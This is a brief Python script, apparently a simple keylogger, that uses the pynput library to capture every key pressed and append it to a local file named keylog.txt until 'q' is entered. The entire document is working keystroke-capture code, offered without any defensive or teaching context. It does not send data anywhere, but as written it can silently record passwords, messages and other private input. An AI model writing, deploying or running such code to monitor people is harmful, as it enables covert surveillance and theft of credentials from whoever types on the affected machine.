from pynput.keyboard import Listener

def on_press(key):
    with open('keylog.txt', 'a') as f:
        f.write(str(key))

# Create a listener instance
listener = Listener(on_press=on_press)

# Start the listener
listener.start()

# Main loop to check for 'q' key to stop the keylogger
while True:
    if input() == 'q':
        break

# Stop the listener and close the file
listener.stop()
listener.join()